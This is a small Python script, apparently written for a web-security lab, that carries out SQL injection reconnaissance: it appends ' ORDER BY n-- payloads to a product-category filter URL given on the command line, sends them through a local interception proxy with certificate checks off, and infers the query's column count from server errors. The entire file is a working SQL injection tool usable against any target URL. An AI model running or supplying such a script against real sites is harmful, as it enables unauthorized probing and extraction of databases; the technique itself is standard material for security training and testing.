#!/bin/python3
import urllib3
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https:": "http://127.0.0.1:8080"}

def exploit(url):
	uri="/filter?category=Pets"
	for i in range(1,10):
		payload = f"' ORDER+BY {i}--"
		r = requests.get(url + uri + payload, proxies=proxies, verify=False)
		res = r.text
		if "Internal Server Error" in res:
			return i - 1
		i+=1
	return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage %s <URL> <Payload> \n" % sys.argv[0])
        sys.exit(-1)
    print("[+] Figuring out the number of columns...")
    number_Columns=exploit(url)
    if number_Columns:
        print(f"The number of columns in this site is: {str(number_Columns)}")
    else:
        print("[-] SQLi Unsuccessful")
